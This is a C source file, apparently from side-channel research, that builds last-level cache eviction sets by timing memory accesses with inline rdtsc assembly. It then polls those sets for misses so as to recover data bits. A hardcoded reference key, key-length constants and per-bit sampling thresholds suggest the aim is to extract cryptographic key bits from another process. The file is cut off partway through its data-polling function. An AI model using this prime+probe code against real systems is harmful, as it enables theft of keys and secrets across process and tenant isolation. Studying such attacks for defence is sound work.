
#include "EvictionSet.h"

#include <time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>

//#define PRINTF printf
#define PRINTF(bla...)
#define ROUTE_NUM 10

#if KEYS_LEN_IN_BITS == 4096
#define MAX_WRONG_ZEROS 			1
#define MAX_WRONG_ONES  			1
#define MAX_SAMPLES_PER_BIT 		9
#else
#define MAX_WRONG_ZEROS 			1
#define MAX_WRONG_ONES  			1
#define MAX_SAMPLES_PER_BIT 		5
#endif

#define POINTS_PER_ONE_BIT   		100
#define POINTS_PER_ZERO_BIT  		2
#define NUMBER_OF_KEYS_TO_SAMPLE 	100
#define BITS_IN_CHUNK 				16
#define MAX_HANDLED_EXTRA_BITS 		30
#define MAX_SAMPLES_PER_BIT 		9
#define MAX_MISSING_BITS 300

#define BAD_BIT 					0xa

//LinesBuffer Buffer;
//char Space[512000];
//Cache_Mapping EvictionSets;
//uint32_t LowestTimings[12000000];
//int g_tmp = 0;
//char* g_pCurrentLine;
//int SourceSockFd;
// int DestSockFd;
char RealKey[] = {"023456789abcdef1dcba987654321112233445566778899aabbccddeef1eeddccbbaa99887766554433221100111222333444555666777888999aaabbbcccddd"
		"101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f"
		"505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e70f808182838485868788898a8b8c8d8e8"
		"909192939495969798999a9b9c9d9e91a0a1a2a3a4a5a6a7a8a9aaabacadaea1b0b1b2b3b4b5b6b7b8b9babbbcbdbeb1c0c1c2c3c4c5c6c7c8c9cacbcccdcec1"
		"d0d1d2d3d4d5d6d7d8d9dadbdcddded1e0e1e2e3e4e5e6e7e8e9eaebecedeee1f0f1f2f3f4f5f6f7f8f91a1b1c1d1e1f123456789abcdef1dcba987654321521"
		"18152229364350576471788592991061131201271341411481551621691761831901972032102172242312392462532602672742812892963033103173243313"
		"01123581321345589144233377610987159725844181676510946177112865746368750251213931964183178115142298320401346269217830935245785702"
		"123456789abcdef1dcba987654321112233445566778899aabbccddeef1eeddccbbaa99887766554433221100111222333444555666777888999aaabbbcccddd"};

// #define SOCK_NAME "/home/guyard/socket2"

LinesBuffer TestBuffer;

char* RandomizeOrderInMemory(char* Memory, uint32_t Size);
char* RandomizeOrderInMemory2(char* Memory, uint32_t Size);
void RandomizeSets(Cache_Mapping* pCacheSets);
void RandomizeRawSet(Raw_Cache_Set* pSet);
void RandomizeSet(Cache_Set* pSet);
int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine);
uint32_t GetCurrentContextSwitchNum();
int MakeSets(char* Memory, uint32_t Size, Cache_Mapping* pCacheSets);
int AdressToSet(char* Adress);
void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort);
int ValidateSet(char* Set, int SetSize);
char* StringToBuff(char* String);

__always_inline int ProbeAsm(char* pSet, int SetSize, char* pLine, int FindMisses)
{
	int Time;
	int j;
	int MaxLoops = 1;
	int CacheMisses = 0;
	int CacheHits = 0;
	int ContextSwitchHappened = 0;
	int ContextSwitches = 0;
	char* pCurrLine = pSet;
	int fails = 0;

	if (SetSize == 0)
		return 0;

	for (j = 0; j < SetSize - 1; j++)
	{
		pCurrLine = *(char**)pCurrLine;
		//printf("Line %x\r\n", (unsigned int)pCurrLine);
	}

	*(char**)pCurrLine = pLine;
	*(char**)pLine = 0;

	//printf("Testing Line %x\r\n", (unsigned int)pLine);

	for (j = 0; j < MaxLoops; j++) {
		// First of all, touch the record.
		Time = CACHE_POLL_MAX_HIT_THRESHOLD_IN_TICKS + 1;

		// While the results aren't obvious, keep probing this line.
		while (ContextSwitchHappened ||
				(Time > CACHE_POLL_MAX_HIT_THRESHOLD_IN_TICKS &&
				Time < CACHE_POLL_MIN_MISS_THRESHOLD_IN_TICKS))
		{
			int ContextNum = GetCurrentContextSwitchNum();

			// Now go over all the records in the set for the first time.
			asm volatile ("movl %0, %%ecx;" : : "r" (SetSize) : "ecx");
			asm volatile ("mov %0, %%r8;" : : "r" (pSet) : "r8");
			asm volatile ("mov %0, %%r9;" : : "r" (pLine) : "r9");
			asm volatile ("mov (%r9), %r10;");
			asm volatile ("lfence;");
			asm volatile ("2:");
			asm volatile ("mov %r8, %r11;");
			asm volatile ("mov (%r8), %r8;");
			asm volatile ("loop	2b;");

			// Now go over all the records in the set, then touch the original record again and check timing.
			asm volatile ("movl %0, %%ecx;" : : "r" (SetSize) : "ecx");
			asm volatile ("mov %0, %%r8;" : : "r" (pSet) : "r8");
			asm volatile ("mov %0, %%r9;" : : "r" (pLine) : "r9");
			asm volatile ("mov (%r9), %r10;");
			asm volatile ("lfence;");
			asm volatile ("1:");
			asm volatile ("mov %r8, %r11;");
			asm volatile ("mov (%r8), %r8;");
			asm volatile ("loop	1b;");
			asm volatile ("lfence;");
			asm volatile ("mov (%r11), %r10;");
			asm volatile ("rdtsc;");
			asm volatile ("movl %eax, %edi;");
			asm volatile ("lfence;");
			asm volatile ("mov (%r8), %r8;");
			asm volatile ("lfence;");
			asm volatile ("mov (%r11), %r10;");
			asm volatile ("rdtsc;");
			asm volatile ("subl %edi, %eax;");
			asm volatile ("movl %%eax, %0;" : "=r" (Time));

			ContextSwitchHappened = (ContextNum != GetCurrentContextSwitchNum());
			ContextSwitches += ContextSwitchHappened;
			fails++;
		}

		//printf("Probed %d lines, Took %d nano, %d context switches, %d failures\r\n", SetSize, Time, ContextSwitches, fails - 1);

		CacheMisses += (Time >= CACHE_POLL_MIN_MISS_THRESHOLD_IN_TICKS);
		CacheHits += (Time <= CACHE_POLL_MAX_HIT_THRESHOLD_IN_TICKS);

		*(char**)pCurrLine = 0;

		//if (!FindMisses && CacheHits > 0)
		//	return 0;
/*
		else if (FindMisses && CacheMisses > 0)
			return 1;
		if (CacheMisses > (MaxLoops / 2) || CacheHits > (MaxLoops / 2))
			return (CacheMisses > (MaxLoops / 2));
			*/

		if (CacheHits)
			return 0;

	}

	return CacheMisses > (MaxLoops / 2);
	//return 1;
}

int PollAsm(char* pSet, int SetSize)
{
	long int Miss = 0;
	int PollTimeLimit = CACHE_POLL_MIN_SET_MISS_THRESHOLD_IN_TICKS;

	if (SetSize == 0)
		return 0;

	asm volatile ("mov %0, %%r8;" : : "r" (pSet) : "r8");
	asm volatile ("movl %0, %%ebx;" : : "r" (PollTimeLimit) : "ebx");
	asm volatile ("mov %0, %%r10;" : : "r" (Miss) : "r10");
	asm volatile ("movl %0, %%ecx;" : : "r" (SetSize) : "ecx");

	asm volatile ("CHECK_LINE:");

	asm volatile ("rdtsc;");
	asm volatile ("movl %eax, %edi;");
	asm volatile ("mov (%r8), %r8;");
	asm volatile ("lfence;");
	asm volatile ("rdtsc;");
	asm volatile ("subl %edi, %eax;");
	asm volatile ("cmp %eax, %ebx;");
	asm volatile ("jnl HIT");
	//asm volatile ("movl %%eax, %0;" : "=r" (Time));
	asm volatile ("MISS:");
	asm volatile ("inc %r10");
	asm volatile ("HIT:");

	asm volatile ("loop	CHECK_LINE;");

	asm volatile ("mov %%r10, %0;" : "=r" (Miss));

	return Miss;
#if 0
	// While the results aren't obvious, keep probing this line.
	asm volatile ("movl %0, %%ecx;" : : "r" (SetSize) : "ecx");
	//asm volatile ("movl %ecx, %ebx;");
	asm volatile ("mov %0, %%r8;" : : "r" (pSet) : "r8");
	//asm volatile ("mov %r8, %r9;");

	// Now go over all the records in the set for the first time.
	asm volatile ("lfence;");
	asm volatile ("2:");
	asm volatile ("mov (%r8), %r8;");
	asm volatile ("loop	2b;");
	asm volatile ("lfence;");

	/*
	// Go over it a second time
	asm volatile ("mov %r9, %r8;");
	asm volatile ("movl %ebx, %ecx;");
	asm volatile ("1:");
	asm volatile ("mov (%r8), %r8;");
	asm volatile ("loop	1b;");
	*/

	asm volatile ("rdtsc;");
	asm volatile ("movl %eax, %edi;");
	asm volatile ("mov (%r8), %r8;");
	asm volatile ("lfence;");
	asm volatile ("rdtsc;");
	asm volatile ("subl %edi, %eax;");
	asm volatile ("movl %%eax, %0;" : "=r" (Time));

	PRINTF("Probed %d lines, Took %d nano\r\n", SetSize, Time);

	CacheMisses += (Time >= CACHE_POLL_MIN_SET_MISS_THRESHOLD_IN_TICKS);

	return CacheMisses;
#endif
}

int ProbeThreeTimes(char* pSet, int SetSize, char* pLine, int FindMisses)
{
	int Misses = 4;
	int Result = 0;

	PRINTF("Probing\r\n");

	while (Misses > 2 && Misses < 5) {
		Misses = 0;

		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad1[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad2[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad3[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad4[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad5[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad6[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		char Pad7[128];
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;

		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		Result = ProbeAsm(pSet, SetSize, pLine, FindMisses);
		Misses += Result;
		memset(Pad1, 0, sizeof(Pad1));
		memset(Pad2, 0, sizeof(Pad2));
		memset(Pad4, 0, sizeof(Pad4));
		memset(Pad3, 0, sizeof(Pad3));
		memset(Pad5, 0, sizeof(Pad4));
		memset(Pad6, 0, sizeof(Pad3));
		memset(Pad7, 0, sizeof(Pad4));
	}

	PRINTF("%d Misses\r\n", Misses);
	return Misses >= 5;
}

/**
 * Receives a large buffer in memory, and partitions it into sets in the cache.
 * Returns the number of sets it found.
 */
int CreateEvictionSet(LinesBuffer* pBuffer, Cache_Mapping* pEvictionSets)
{
	char* Memory = pBuffer->Lines->Bytes;
	int Size = sizeof(LinesBuffer);
	int i, j;
	Raw_Cache_Mapping RawMapping;
	int FilledSetIndex = 0;
	int SetsInCurrModulu;
	int CurrSetInSlice;
	int FindSetAttempts;

	memset(pEvictionSets, 0, sizeof(Cache_Mapping));
	memset(&RawMapping, 0, sizeof(RawMapping));

	// Go over all raw sets and split them to real sets.
	for (j = 0; j < RAW_SETS; j++)
	{
		for (i = j * BYTES_IN_LINE, SetsInCurrModulu = 0; i < Size && SetsInCurrModulu < SLICE_NUM; i += BYTES_IN_LINE * RAW_SETS)
		{
			// Get bit 1 of the slice.
			char* CurrAdress = Memory + i;
			int Set = AdressToSet(CurrAdress);
			int Miss = 0;

			// First of all, determine if this line belongs to a set we already found!
			for (CurrSetInSlice = FilledSetIndex - SetsInCurrModulu; CurrSetInSlice < FilledSetIndex; CurrSetInSlice++)
			{
				Miss = ProbeThreeTimes(pEvictionSets->Sets[CurrSetInSlice].Lines[0], pEvictionSets->Sets[CurrSetInSlice].ValidLines, CurrAdress, 0);

				// If the line conflicts with this set, give it up, we don't care about it no more
				if (Miss) break;
			}

			if (Miss) continue;

			// Now go over all the relevant sets and check
			RandomizeRawSet(&RawMapping.Sets[Set]);
			Miss = ProbeThreeTimes(RawMapping.Sets[Set].Lines[0], RawMapping.Sets[Set].ValidLines, CurrAdress, 0);

			// If its a miss, there is no conflict, insert line into raw set.
			if (!Miss) {
				if (RawMapping.Sets[Set].ValidLines >= RAW_LINES_IN_SET)
				{
					break;
				}

				RawMapping.Sets[Set].Lines[RawMapping.Sets[Set].ValidLines] = CurrAdress;
				RawMapping.Sets[Set].ValidLines++;
			}
			// A miss means we conflict with a set. find the conflicting set!
			else
			{
				for (FindSetAttempts = 0; FindSetAttempts < 3; FindSetAttempts++)
				{
					int FoundNewSet = FindSet(&RawMapping.Sets[Set], &pEvictionSets->Sets[FilledSetIndex], CurrAdress);
					SetsInCurrModulu += FoundNewSet;
					FilledSetIndex += FoundNewSet;

					if (FoundNewSet)
					{
						printf("Found set %d\r\n", FilledSetIndex);
						RandomizeSet(&pEvictionSets->Sets[FilledSetIndex]);
						break;
					}
				}
			}
		}
	}

	pEvictionSets->ValidSets = FilledSetIndex;
	return FilledSetIndex;
}

char* RandomizeOrderInMemory(char* Memory, uint32_t Size)
{
	uint32_t* FreeCellsArray = malloc(Size * sizeof(uint32_t));
	uint32_t i;
	uint32_t CurrentSize = Size;

	// First, create an array where every element points to itself.
	for (i = 0; i < Size; i++)
	{
		FreeCellsArray[i] = i;
	}

	uint32_t FirstCell = rand() % CurrentSize;
	uint32_t CurrentCell = FirstCell;
	FreeCellsArray[CurrentCell] = FreeCellsArray[CurrentSize - 1];
	FreeCellsArray[CurrentSize - 1] = 0;
	CurrentSize--;

	for (i = 1; i < Size; i++)
	{
		uint32_t RandomPlace = rand() % CurrentSize;
		uint32_t NextCell = FreeCellsArray[RandomPlace];
		uint64_t* pMemLoc;

		pMemLoc = ((uint64_t*)(Memory + CurrentCell * BYTES_IN_LINE));
		*pMemLoc = ((uint64_t)(Memory + NextCell * BYTES_IN_LINE));
		CurrentCell = NextCell;

		// Fill the used cell with the value of the last cell.
		FreeCellsArray[RandomPlace] = FreeCellsArray[CurrentSize - 1];
		FreeCellsArray[CurrentSize - 1] = 0;
		CurrentSize--;
	}

	free(FreeCellsArray);
	return Memory + FirstCell * BYTES_IN_LINE;
}

char* RandomizeOrderInMemory2(char* Memory, uint32_t Size)
{
	uint32_t* FreeCellsArray = malloc(Size / SETS_IN_CACHE * sizeof(uint32_t));
	uint32_t i;
	uint32_t CurrentSize = Size / SETS_IN_CACHE;

	// First, create an array where every element points to itself.
	for (i = 0; i < Size / SETS_IN_CACHE; i++)
	{
		FreeCellsArray[i] = i;
	}

	uint32_t FirstCell = rand() % CurrentSize;
	uint32_t CurrentCell = FirstCell;
	FreeCellsArray[CurrentCell] = FreeCellsArray[CurrentSize - 1];
	FreeCellsArray[CurrentSize - 1] = 0;
	CurrentSize--;

	for (i = 1; i < Size / SETS_IN_CACHE; i++)
	{
		uint32_t RandomPlace = (CurrentCell + rand()) % CurrentSize;
		uint32_t NextCell = FreeCellsArray[RandomPlace];
		uint64_t* pMemLoc;

		pMemLoc = ((uint64_t*)(Memory + CurrentCell * SETS_IN_CACHE * BYTES_IN_LINE));
		*pMemLoc = ((uint64_t)(Memory + NextCell * SETS_IN_CACHE * BYTES_IN_LINE));
		CurrentCell = NextCell;

		// Fill the used cell with the value of the last cell.
		FreeCellsArray[RandomPlace] = FreeCellsArray[CurrentSize - 1];
		FreeCellsArray[CurrentSize - 1] = 0;
		CurrentSize--;
	}

	free(FreeCellsArray);
	return Memory + FirstCell * SETS_IN_CACHE * BYTES_IN_LINE;
}

uint32_t GetCurrentContextSwitchNum()
{
	return 0;
#ifdef blat
	static IsFirstTime = 1;
	static pId;
	/*const char *arg_list[] = {"grep", "ctxt", "/proc/10106/status", NULL};
	int NonVoluntaryContextSwitches = system("grep ctxt /proc/10106/status");
	*/

	static char pName[200];
	char pLine[200];
	FILE* pFile;
	int i;
	uint32_t Result;

	if (IsFirstTime)
	{
		pId = getpid();
		sprintf(pName, "/proc/%d/status", pId);
	}

	pFile = fopen(pName, "r");

	for (i = 0; i < 41; i++)
	{
		fgets(pLine, sizeof(pLine), pFile);
	}

	for (i = 0; i < sizeof(pLine); i++)
	{
		if (pLine[i] >= '0' && pLine[i] <= '9') {
			Result = atoi(&pLine[i]);
			break;
		}
	}

	fclose(pFile);
	return Result;
#endif
}

int AdressToSet(char* Adress)
{
	return (((uint64_t)Adress >> 6) & 0b11111111111);
}

void RandomizeSets(Cache_Mapping* pCacheSets)
{
	int SetIdx, LineIdx;
	int LinesInSet[LINES_IN_SET];

	for (SetIdx = 0; SetIdx < SETS_IN_CACHE; SetIdx++)
	{
		for (LineIdx = 0; LineIdx < LINES_IN_SET - 1; LineIdx++)
		{
			LinesInSet[LineIdx] = LineIdx + 1;
		}

		int LinesLeft = LINES_IN_SET - 1;
		int CurrLine = 0;

		for (LineIdx = 0; LineIdx < LINES_IN_SET && LinesLeft > 0; LineIdx++)
		{
			int NewPos = rand() % LinesLeft;
			unsigned int RandomLine = LinesInSet[NewPos];
			LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
			LinesInSet[LinesLeft - 1] = 0;
			LinesLeft--;
			*((uint64_t*)pCacheSets->Sets[SetIdx].Lines[CurrLine]) = ((uint64_t)pCacheSets->Sets[SetIdx].Lines[RandomLine]);
			CurrLine = RandomLine;
		}
	}
}

void RandomizeRawSet(Raw_Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0)
		return;

	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

void RandomizeSet(Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0){
		free(LinesInSet);
		return;
	}

	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

int DecreaseSetSize(Raw_Cache_Set* pSmallSet, char* pConflictingLine)
{
	int ConflictLineIndex;
	char* pLinesAnchor;
	int i;
	int Attempts = 5;

	while (pSmallSet->ValidLines > LINES_IN_SET && Attempts)
	{
		RandomizeRawSet(pSmallSet);
		pLinesAnchor = pSmallSet->Lines[0];
		char* pLinesCurrentEnd = pSmallSet->Lines[0];
		Attempts--;

		// Find the end of the set
		while (*(char**)pLinesCurrentEnd != 0)
		{
			pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
		}

		// Find all the lines in the conflict set which are the same set as the target.
		for (ConflictLineIndex = 0; ConflictLineIndex < pSmallSet->ValidLines; ConflictLineIndex++)
		{
			char* pCurrLine = pLinesAnchor;

			if (pLinesAnchor == NULL)
			{
				break;
			}

			// Pop the first line out of the conflict set.
			pLinesAnchor = *((char**)pLinesAnchor);

			// If the line we removed conflicted with the new line, add the line to the set.
			if (!ProbeThreeTimes(pLinesAnchor, pSmallSet->ValidLines - 1, pConflictingLine, 1))
			{
				*((char**)pLinesCurrentEnd) = pCurrLine;
				pLinesCurrentEnd = pCurrLine;
			}
			// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
			else
			{
				// Find the line in the small set and remove it.
				for (i = 0; i < pSmallSet->ValidLines; i++)
				{
					if (pSmallSet->Lines[i] == pCurrLine) {
						pSmallSet->Lines[i] = pSmallSet->Lines[pSmallSet->ValidLines - 1];
						pSmallSet->ValidLines --;
					}
				}

				if (pSmallSet->ValidLines <= LINES_IN_SET)
				{
					break;
				}
			}
		}
	}

	// Lets check wether these lines coincide
	if (pSmallSet->ValidLines == LINES_IN_SET)
	{
		RandomizeRawSet(pSmallSet);
		while (ProbeThreeTimes(pSmallSet->Lines[0], pSmallSet->ValidLines, pConflictingLine, 1))
		{
			return 1;
		}
	}

	return 0;
}

int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine)
{
	char* pNewSetEnd 					= NULL;
	char* pNonConflictingAnchor 		= pBigSet->Lines[0];
	char* pLinesAnchor 					= pBigSet->Lines[0];
	char* pLinesCurrentEnd				= pBigSet->Lines[0];
	int ConflictLineIndex;
	int LineInEvictionSet 				= 0;
	int CurrentConflictSize 			= pBigSet->ValidLines;
	Raw_Cache_Set tmpSet;
	int SetFound						= 0;
	int BigSetIdx, SmallSetIdx;
	int WhileIdx = 0;
	int LinesToCheck;
	static int ElevenLinesSetsFound = 0;

	if (pBigSet->Lines[0] == NULL || pBigSet->ValidLines < LINES_IN_SET)
		return 0;

	RandomizeRawSet(pBigSet);

	/*
	if (!ProbeThreeTimes(pLinesAnchor, CurrentConflictSize, pConflictingLine, 0))
	{
		return 0;
	}
	*/

	// Find the end of the set
	while (*(char**)pLinesCurrentEnd != 0)
	{
		pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
	}

	// If we haven't found enough lines and not enough left to check, leave.
	if (pBigSet->ValidLines < 12)
	{
		return 0;
	}
	else if (pBigSet->ValidLines == 12)
	{
		memcpy(&tmpSet, pBigSet, sizeof(tmpSet));
		LineInEvictionSet = 12;
	}
	else
	{
		while (LineInEvictionSet < LINES_IN_SET)
		{
			LinesToCheck = pBigSet->ValidLines - LineInEvictionSet;
			WhileIdx++;

			// Remerge the 2 lists together, and try finding conflicting lines once more
			if (WhileIdx > 1)
			{
				*(char**)pNewSetEnd = pLinesAnchor;
				pLinesAnchor = pNonConflictingAnchor;
				CurrentConflictSize = pBigSet->ValidLines;
			}

			if (WhileIdx > 5)
				break;

			pNewSetEnd = NULL;
			pNonConflictingAnchor = NULL;

			// Find all the lines in the conflict set which are the same set as the target.
			for (ConflictLineIndex = 0; ConflictLineIndex < LinesToCheck; ConflictLineIndex++)
			{
				char* pCurrLine = pLinesAnchor;

				if (pLinesAnchor == NULL)
				{
					break;
				}

				// Pop the first line out of the conflict set.
				pLinesAnchor = *((char**)pLinesAnchor);

				// If the line we removed conflicted with the new line, add the line to the set.
				if (!ProbeThreeTimes(pLinesAnchor, CurrentConflictSize - 1, pConflictingLine, 1))
				{
					tmpSet.Lines[LineInEvictionSet] = pCurrLine;
					*(char**)pCurrLine = 0;

					LineInEvictionSet++;
					*((char**)pLinesCurrentEnd) = pCurrLine;
					pLinesCurrentEnd = pCurrLine;
				}
				// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
				else
				{
					if (pNewSetEnd == NULL)
						pNewSetEnd = pCurrLine;

					CurrentConflictSize--;
					*((char**)pCurrLine) = pNonConflictingAnchor;
					pNonConflictingAnchor = pCurrLine;

					/*
					*(char**)pCurrLine = 0;
					*((char**)pLinesCurrentEnd) = pCurrLine;
					pLinesCurrentEnd = pCurrLine;
					*/
				}
			}
		}
	}

	// Lets check wether these lines coincide
//	if (LineInEvictionSet >= LINES_IN_SET - 1)
	if (LineInEvictionSet >= LINES_IN_SET)			//Allow only 12 lines/set!!!!
	{
		tmpSet.ValidLines = LineInEvictionSet;
		RandomizeRawSet(&tmpSet);

		// Make sure the new set still conflicts with the line.
		if (ProbeThreeTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine, 1) &&
			ProbeThreeTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine, 1) &&
			ProbeThreeTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine, 1))
		{
			// If there are too many lines, keep trimming then down.
			if (LineInEvictionSet > LINES_IN_SET)
				SetFound = DecreaseSetSize(&tmpSet, pConflictingLine);
			else
				SetFound = 1;
		}

		if (SetFound)
		{
			if (LineInEvictionSet == 11)
			{
				ElevenLinesSetsFound++;
			}

			// If we found a set, YAY, time to remove it from the conflicting set.
			for (SmallSetIdx = 0; SmallSetIdx < tmpSet.ValidLines; SmallSetIdx++)
			{
				BigSetIdx = 0;
				pSmallSet->Lines[SmallSetIdx] = tmpSet.Lines[SmallSetIdx];

				while (BigSetIdx < pBigSet->ValidLines)
				{
					// if its the same line, remove it from the big set.
					if (pBigSet->Lines[BigSetIdx] == tmpSet.Lines[SmallSetIdx])
					{
						pBigSet->Lines[BigSetIdx] = pBigSet->Lines[pBigSet->ValidLines - 1];
						pBigSet->Lines[pBigSet->ValidLines - 1] = 0;
						pBigSet->ValidLines--;
						break;
					}

					BigSetIdx++;
				}
			}

			pSmallSet->ValidLines = tmpSet.ValidLines;
//			printf("%d sets of 11 lines found\r\n", ElevenLinesSetsFound);

			return 1;
		} else {
			PRINTF("Bad set!\r\n");
		}
	} else
	{
		PRINTF("Not enough lines %d in set\r\n", LineInEvictionSet);
	}

	return 0;
}

char** GetMemoryStatistics(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats, int fReturnSamples)
{
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	char** AllSetsSamples = malloc(sizeof(char*) * SETS_IN_CACHE);

	clock_gettime(CLOCK_REALTIME, &start);

	// Sample all sets and check their statistics
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		AllSetsSamples[Set] = PollForDataBits(&pEvictionSets->Sets[Set], CACHE_POLL_SAMPLES_PER_SET);

		int TimeSinceLastMiss = 1;
		int MissNum = 0;
		double Mean = 0;
		double Var = 0;

		// go over all the samples and do some statistic calculations
		for (Sample = 1; Sample <= CACHE_POLL_SAMPLES_PER_SET; Sample++)
		{
			if (AllSetsSamples[Set][Sample])
			{
				MissNum++;
				Var += TimeSinceLastMiss * TimeSinceLastMiss;
				TimeSinceLastMiss = 1;
			}
			else
			{
				TimeSinceLastMiss++;
			}
		}

		Mean = MissNum / CACHE_POLL_SAMPLES_PER_SET;

		// If there were no misses, variance -> infinity, so just put a big number here.
		if (MissNum == 0)
			Var = 1000000;
		else
			Var /= MissNum;

		pCacheStats->SetStats[Set].mean = Mean;
		pCacheStats->SetStats[Set].num = MissNum;
		pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);
		pCacheStats->SetStats[Set].variance = Var;
	}

	if (!fReturnSamples)
	{
		for (Set = 0; Set < SETS_IN_CACHE; Set++)
		{
			free(AllSetsSamples[Set]);
		}

		free(AllSetsSamples);
		return NULL;
	}

	return AllSetsSamples;
}

void WriteStatisticsToFile(Cache_Statistics* pCacheStats, char* pFileName, int Sorted)
{
	FILE* pFile;
	pFile = fopen(pFileName, "wr");
	int Set;
	char Stats[150];
	Cache_Statistics SortedStats;

	if (Sorted)
	{
		SortStatistics(pCacheStats, &SortedStats);
	}

	// Time to parse the data.
	for (Set = SETS_IN_CACHE - 1; Set >= 0 ; Set--)
	{
		unsigned int SetNum = (unsigned int)SortedStats.SetStats[Set].mean;
		sprintf(Stats, "Set %d, Num %ld, mean %lf, var %lf, offset %lx\r\n", SetNum, (long int)pCacheStats->SetStats[SetNum].num,
				pCacheStats->SetStats[SetNum].mean, pCacheStats->SetStats[SetNum].variance, pCacheStats->SetStats[SetNum].offset);
		fwrite(Stats, strlen(Stats), 1, pFile);
	}

	fclose(pFile);
}


void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort)
{
	unsigned int FirstIdx, SecondIdx, Set, tmp;

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		StatisticsToSort->SetStats[Set].num = BaseStatistics->SetStats[Set].num;
		StatisticsToSort->SetStats[Set].mean = Set;
	}

	for (FirstIdx = 0; FirstIdx < SETS_IN_CACHE; FirstIdx++)
	{
		for (SecondIdx = 0; SecondIdx + 1 < SETS_IN_CACHE - FirstIdx; SecondIdx++)
		{
			if (StatisticsToSort->SetStats[SecondIdx + 1].num < StatisticsToSort->SetStats[SecondIdx].num)
			{
				tmp = StatisticsToSort->SetStats[SecondIdx].num;
				StatisticsToSort->SetStats[SecondIdx].num = StatisticsToSort->SetStats[SecondIdx + 1].num;
				StatisticsToSort->SetStats[SecondIdx + 1].num = tmp;
				tmp = StatisticsToSort->SetStats[SecondIdx].mean;
				StatisticsToSort->SetStats[SecondIdx].mean = StatisticsToSort->SetStats[SecondIdx + 1].mean;
				StatisticsToSort->SetStats[SecondIdx + 1].mean = tmp;
			}
		}
	}
}

char* PollForData(Cache_Set* pSet, uint64_t BytesToRead)
{
	char* DataRead = malloc(sizeof(char) * BytesToRead);
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	for (Sample = 0; Sample < BytesToRead * 8; Sample++)
	{
		clock_gettime(CLOCK_REALTIME, &start);

		Miss = PollAsm(pSet->Lines[0], pSet->ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

		DataRead[Sample / 8] |= ((Miss > 0) << (8 - (Sample % 8)));

		do {
			clock_gettime(CLOCK_REALTIME, &end);
